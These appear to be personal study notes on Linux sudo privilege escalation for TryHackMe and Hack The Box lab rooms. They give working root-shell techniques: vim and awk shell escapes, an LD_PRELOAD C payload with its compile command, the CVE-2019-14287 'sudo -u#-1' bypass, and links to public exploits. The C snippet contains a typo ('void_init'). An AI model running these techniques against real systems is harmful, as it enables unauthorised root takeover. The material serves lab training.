Allows us to run command as ROOT

# Escalation via Sudo Shell Escaping
❗️ GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/)

Good Practice: Linux PrivEsc Playground - [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)

- ALWAYS run `sudo -l` to check
```bash
sudo -l #show what we can do as root without password
#utilize GTFOBins for appropriate command
sudo vim -c ':!/bin/sh' #if vim available

#if awk available
sudo awk 'BEGIN {system("/bin/sh")}'
```

# Escalation via Intended Functionality
wget example - [https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)

if no escape through GTFOBins, still can use the powers as intended >> need to think outside of the box

# Escalation via LD_PRELOAD
If we see `LD_PRELOAD` in sudo -l
loading our own library before other libraries
```bash
nano shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
#exit nano

gcc -fPIC -shared -o shell.so shell.c -nostartfiles #compile
sudo LD_PRELOAD=/home/user/shell.so <what we want to run as root> 
```

# THM Challenge - Simple CTF 

dirsearch - [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

Exploit-DB for Simple CMS - [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)

- enumerate >> see what's open
	- check ftp, if nothing focus on web route
- do directory busting
	- dirsearch example
```bash
cd /opt/disearch/
python3 dirsearch.py -u http://10.10.149.152 -e php,html -x 400,401,403
```
dirsearch: https://github.com/maurosoria/dirsearch
- 301, redirect on simple >> check it out
	- search google for version exploit >> CMS made simple 2.2.8
- after getting low level user do basic enum
- can see sudo-l vim available, use GTFOBins for sudo shell escape

# CVE-2019-14287 Overview
Exploit-DB for CVE-2019-14287 - [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

THM ROOM: https://tryhackme.com/room/sudovulnsbypass
Escalation:
- key command: `sudo -u#-1 /bin/bash`
- ls
- cat root.txt

# CVE-2019-18634 Overview
Exploit for CVE-2019-18634 - [https://github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

if pwfeedback is on you will see asterisks when inputting password

THM ROOM: https://tryhackme.com/room/sudovulnsbof
Escalation:
- `sudo -V` for sudo version > if before 1.8.26 can run exploit


